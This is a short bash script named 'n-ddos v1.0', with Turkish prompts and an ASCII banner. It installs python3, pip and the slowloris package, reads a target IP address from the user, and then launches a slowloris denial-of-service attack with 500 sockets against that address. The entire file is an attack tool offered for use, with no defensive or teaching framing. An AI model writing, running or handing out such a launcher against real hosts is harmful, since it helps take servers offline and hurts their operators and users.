#!/bin/bash
echo "n-ddos v1.0"

echo "                                         
 #    #       #####  #####   ####   ####  
 ##   #       #    # #    # #    # #      
 # #  # ##### #    # #    # #    #  ####  
 #  # #       #    # #    # #    #      # 
 #   ##       #    # #    # #    # #    # 
 #    #       #####  #####   ####   ####  
                                        
"       

echo "Setup icin entere basiniz."
read -p enter
clear
echo "Kurulum basliyor... (eger ki kurulum hata verirse root olup baslat)"
sleep 3
apt install python3
apt install pip
pip install slowloris
clear
echo "Kurulum bitti"
sleep 3
clear
echo "Lütfen bir hedef ip giriniz..."
read ip1
echo "Hedef ip:" $ip1
sleep 2
echo "Socket sayısı : 500"
sleep 5
clear
slowloris $ip1 -s 500
                                                          
                                                          
                                                          
                                                          
                                                          
                                                          
                                                          
                                                          
                                                          
                                                          
                                                          
                                                          

